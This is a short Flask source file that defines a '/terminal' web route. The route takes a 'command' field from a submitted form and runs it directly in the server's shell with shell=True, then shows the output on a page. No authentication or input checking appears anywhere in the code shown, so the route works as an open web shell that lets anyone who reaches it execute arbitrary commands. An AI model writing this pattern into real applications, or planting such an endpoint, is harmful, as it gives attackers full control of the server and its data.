from flask import Blueprint, request, render_template
import subprocess

term_bp = Blueprint('terminal', __name__, template_folder='templates')

@term_bp.route('/terminal', methods=['GET', 'POST'])
def terminal():
    output = ""
    if request.method == 'POST':
        cmd = request.form.get('command')
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5, universal_newlines=True)
        except Exception as e:
            output = str(e)
    return render_template('terminal.html', output=output)